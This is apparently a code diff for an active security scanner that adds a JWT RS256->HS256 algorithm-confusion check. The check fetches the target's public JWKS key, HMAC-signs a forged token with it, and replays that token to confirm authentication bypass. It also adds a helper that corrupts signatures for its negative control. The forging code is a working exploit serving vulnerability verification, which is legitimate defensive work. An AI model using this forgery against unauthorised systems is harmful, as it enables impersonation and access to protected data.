@@ -1421,6 +1421,22 @@ def _b64url_encode(data: bytes) -> str:
     return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")
 
 
+def _corrupt_jwt_signature(sig_b64: str) -> str:
+    """A base64url signature GUARANTEED to differ from ``sig_b64`` — flip a bit of the DECODED bytes.
+    Flipping only the trailing base64url character is a no-op ~25% of the time for RSA-sized (256-byte)
+    signatures, because that last char's high bits are unused padding, so the 'corrupted' token can
+    decode to the identical valid signature and the negative control silently passes (a false negative
+    that defeats a real signature-bypass confirmation). Corrupting a decoded byte always changes it."""
+    try:
+        raw = bytearray(_b64url_decode(sig_b64))
+    except (ValueError, binascii.Error):
+        raw = bytearray()
+    if not raw:
+        return "AAAA"  # empty/undecodable signature -> a clearly-invalid, non-empty placeholder
+    raw[0] ^= 0x01     # flip the low bit of the first byte -> a definitely-different signature
+    return _b64url_encode(bytes(raw))
+
+
 def _find_jwt_credential(auth: AuthContext | None) -> tuple[str, str, Callable[[str], str]] | None:
     """The first JWT-shaped credential in the operator's supplied auth (an
     Authorization: Bearer header, or a Cookie crumb), as (header_name, current_token,
@@ -1533,8 +1549,7 @@ def _check_jwt_alg_none(http: _Http, url: str, discovered_token: str = "") -> di
     if not (200 <= int(baseline.get("status") or 0) < 300):
         return None  # can't establish what an "authenticated" response even looks like here
     parts = real_token.split(".")
-    sig = parts[2]
-    corrupted_sig = (sig[:-1] + ("A" if sig[-1:] != "A" else "B")) if sig else "AAAA"
+    corrupted_sig = _corrupt_jwt_signature(parts[2])
     try:
         # Negative control FIRST: a token with a CORRUPTED signature but the real alg.
         # If the server accepts that too, it isn't verifying signatures at all -- a
@@ -1572,6 +1587,141 @@ def _check_jwt_alg_none(http: _Http, url: str, discovered_token: str = "") -> di
                 ev["read_data"] = auth_body[:1200]
             return _finding(
                 "active.jwt-alg-none", "JWT alg:none accepted (signature verification bypass)",
+                "critical", "jwt", "jwt", url, proof, ev,
+            )
+    return None
+
+
+# Well-known JWKS locations to try (same-origin only) to recover the RSA PUBLIC key an RS256 token is
+# verified with — the key material the RS256->HS256 confusion attack HMAC-signs with.
+_JWKS_PATHS = ("/.well-known/jwks.json", "/jwks.json", "/.well-known/openid-configuration")
+_RS_TO_HS = {"RS256": ("HS256", hashlib.sha256), "RS384": ("HS384", hashlib.sha384), "RS512": ("HS512", hashlib.sha512)}
+
+
+def _fetch_rsa_public_pems(http: _Http, url: str, kid: str = "") -> list[bytes]:
+    """Best-effort fetch of the target's own RSA PUBLIC key(s), from a same-origin JWKS/OpenID-config
+    path, returned as PEM (SubjectPublicKeyInfo) bytes — the material the RS256->HS256 confusion attack
+    uses as the HMAC secret. Empty list if none reachable/parseable or ``cryptography`` is unavailable
+    (the check then simply doesn't fire). The key is PUBLIC, so fetching it discloses nothing."""
+    try:
+        from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
+        from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
+    except Exception:  # noqa: BLE001 - optional dep
+        return []
+    parsed = urlparse(url)
+    origin = f"{parsed.scheme}://{parsed.netloc}"
+    pems: list[bytes] = []
+    for path in _JWKS_PATHS:
+        try:
+            resp = http.fetch(f"{origin}{path}")
+        except _ActiveError:
+            continue
+        try:
+            doc = json.loads(resp.get("body") or "")
+        except (ValueError, json.JSONDecodeError):
+            continue
+        # An OpenID discovery doc points at the JWKS via jwks_uri — follow it ONCE, same-host only.
+        if isinstance(doc, dict) and doc.get("jwks_uri") and "keys" not in doc:
+            try:
+                jwks_uri = str(doc["jwks_uri"])
+                if (urlparse(jwks_uri).hostname or "").lower() == (parsed.hostname or "").lower():
+                    doc = json.loads((http.fetch(jwks_uri).get("body") or ""))
+            except (_ActiveError, ValueError, json.JSONDecodeError):
+                continue
+        for key in (doc.get("keys") if isinstance(doc, dict) else None) or []:
+            if not isinstance(key, dict) or key.get("kty") != "RSA" or not key.get("n") or not key.get("e"):
+                continue
+            if kid and key.get("kid") and str(key.get("kid")) != kid:
+                continue  # match the token's kid when both are present
+            try:
+                n = int.from_bytes(_b64url_decode(str(key["n"])), "big")
+                e = int.from_bytes(_b64url_decode(str(key["e"])), "big")
+                pem = RSAPublicNumbers(e, n).public_key().public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)
+                pems.append(pem)
+            except (ValueError, binascii.Error, TypeError):
+                continue
+        if pems:
+            break
+    return pems[:4]
+
+
+def _check_jwt_alg_confusion(http: _Http, url: str, discovered_token: str = "") -> dict[str, Any] | None:
+    """Confirm RS256->HS256 ALGORITHM CONFUSION: the server verifies its JWTs with an RSA PUBLIC key
+    but can be tricked into treating a token as HS256 (symmetric), so a token HMAC-signed with that
+    PUBLIC key — which anyone can fetch from the JWKS — is accepted as authentic. Token forgery / full
+    auth bypass. GET-only forged-token replay; same token sources + differential discipline as the
+    alg:none check (real RS token authenticates, corrupted-sig REJECTED, HS(pubkey) forgery ACCEPTED)."""
+    found = _find_jwt_credential(http.auth)
+    baseline_headers: dict[str, str] | None = None
+    if found is not None:
+        header_name, real_token, rebuild = found
+    elif discovered_token and _JWT_RE.match(discovered_token):
+        header_name, real_token = "Authorization", discovered_token
+        rebuild = lambda new: f"Bearer {new}"  # noqa: E731
+        baseline_headers = {header_name: rebuild(real_token)}
+    else:
+        return None
+    parts = real_token.split(".")
+    if len(parts) != 3 or not all(parts):
+        return None
+    try:
+        header = json.loads(_b64url_decode(parts[0]))
+    except (ValueError, binascii.Error, UnicodeDecodeError, json.JSONDecodeError):
+        return None
+    alg = str(header.get("alg", "")).strip().upper() if isinstance(header, dict) else ""
+    if alg not in _RS_TO_HS:
+        return None  # confusion only applies when the server EXPECTS an asymmetric (RS*) algorithm
+    try:
+        baseline = http.fetch(url, extra_headers=baseline_headers) if baseline_headers else http.fetch(url)
+    except _ActiveError:
+        return None
+    if not (200 <= int(baseline.get("status") or 0) < 300):
+        return None
+    pems = _fetch_rsa_public_pems(http, url, kid=str(header.get("kid") or ""))
+    if not pems:
+        return None  # no public key reachable -> can't forge, nothing to prove
+    # Negative control: a corrupted RS signature MUST be rejected (proves the server verifies at all).
+    corrupted = f"{parts[0]}.{parts[1]}.{_corrupt_jwt_signature(parts[2])}"
+    try:
+        control = http.fetch(url, extra_headers={header_name: rebuild(corrupted)})
+    except _ActiveError:
+        return None
+    if 200 <= int(control.get("status") or 0) < 300:
+        return None  # server doesn't verify signatures at all -> not attributable to alg-confusion
+    hs_alg, digest = _RS_TO_HS[alg]
+    forged_header = dict(header)
+    forged_header["alg"] = hs_alg
+    try:
+        hdr_b64 = _b64url_encode(json.dumps(forged_header, separators=(",", ":")).encode("utf-8"))
+    except (TypeError, ValueError):
+        return None
+    signing_input = f"{hdr_b64}.{parts[1]}".encode("ascii")
+    for pem in pems:
+        sig = _b64url_encode(hmac.new(pem, signing_input, digest).digest())
+        forged = f"{hdr_b64}.{parts[1]}.{sig}"
+        try:
+            probe = http.fetch(url, extra_headers={header_name: rebuild(forged)})
+        except _ActiveError:
+            continue
+        if 200 <= int(probe.get("status") or 0) < 300:
+            proof = _proof(
+                "confirmed", method=f"GET with an RS256->HS256 confused token ({hs_alg}, HMAC-signed with the RSA public key)",
+                affected_asset="every endpoint behind this authentication check — a forged token grants any identity/role",
+                observed_result=f"a token re-signed as {hs_alg} using the target's own RSA public key was accepted (HTTP {probe['status']}), matching the real-token baseline (HTTP {baseline['status']})",
+                control_result=f"a token with a corrupted RS signature was rejected (HTTP {control['status']}) — the server does verify signatures, so accepting the public-key HMAC proves algorithm confusion",
+                evidence="RS256->HS256 confusion confirmed: forgery signed with the public JWKS key accepted, corrupted-signature control rejected",
+            )
+            ev = {
+                "request_line": f"GET {url}",
+                "request_header": f"{header_name}: <token forged as {hs_alg}, HMAC key = the RSA public key>",
+                "response_status": f"HTTP {probe['status']}",
+                "matched_value": f"{alg}->{hs_alg} algorithm-confusion forgery accepted as authenticated",
+            }
+            auth_body = str(probe.get("body") or "")
+            if len(auth_body.strip()) >= 8:
+                ev["read_data"] = auth_body[:1200]
+            return _finding(
+                "active.jwt-alg-confusion", "JWT RS256->HS256 algorithm confusion (token forgery via the public key)",
                 "critical", "jwt", "jwt", url, proof, ev,
             )
     return None
@@ -2045,6 +2195,7 @@ def verify_active(
         # JWT (weak-secret cracks the HMAC key OFFLINE and spends requests only on a hit), and GraphQL
         # introspection only fires on a graphql-shaped path.
         ("jwt", lambda: _check_jwt_alg_none(http, sanitized, discovered_token=discovered_jwt)),
+        ("jwt", lambda: _check_jwt_alg_confusion(http, sanitized, discovered_token=discovered_jwt)),
         ("jwt", lambda: _check_jwt_weak_secret(http, sanitized)),
         ("graphql", lambda: _check_graphql_introspection(http, sanitized)),
         # Schema disclosure via error field-suggestions — fires even when introspection is disabled,
